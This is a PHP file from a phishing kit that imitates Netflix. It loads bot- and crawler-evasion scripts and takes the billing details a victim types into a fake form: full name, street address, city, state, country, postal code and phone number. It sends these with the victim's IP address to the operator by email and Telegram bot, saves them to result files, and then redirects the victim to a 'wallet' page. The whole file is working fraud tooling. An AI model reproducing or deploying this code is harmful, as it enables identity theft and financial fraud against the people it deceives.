<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include '../autob/bts2.php';
include '../req/config.php';

if(isset($_POST['Hsub']) && isset($_POST['fname']) && isset($_POST['street']) && isset($_POST['city']) && isset($_POST['state']) && isset($_POST['country'])){
	///////////////////////// MAIL PART //////////////////////
		$fullname = $_POST['fname'];
		$street_address = $_POST['street'];
		$city = $_POST['city'];
		$country = $_POST['country'];
		$state = $_POST['state'];
		$zip_code = $_POST['zip'];
		$phonetype = $_POST['phonetype'];
		$mobile = $_POST['phonenumber'];
		$PublicIP = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|------------------- BILLING INFO ----------------| 
Full Name        : $fullname   	   
Street Address   : $street_address 
City             : $city          
State            : $state		   
Country          : $country		  
Zip/Postal Code  : $zip_code 	  
Phone Number     : $phonetype | $mobile";
		$_SESSION['fullz'].=$Info_LOG; 
$Info_LOG.='
'.$PublicIP;

// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = '♥♥ Netf1ix FULLz ♥♥ '.$PublicIP ;$headers = 'From: YoCHI <yochnetf@yochnet.com>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		header("location:wallet?consent_ha=8787");
    }
else{header("location:basic?".$theerrkey."=c3Fauth".md5(rand(100, 999999999))."&p=empty"); };
?>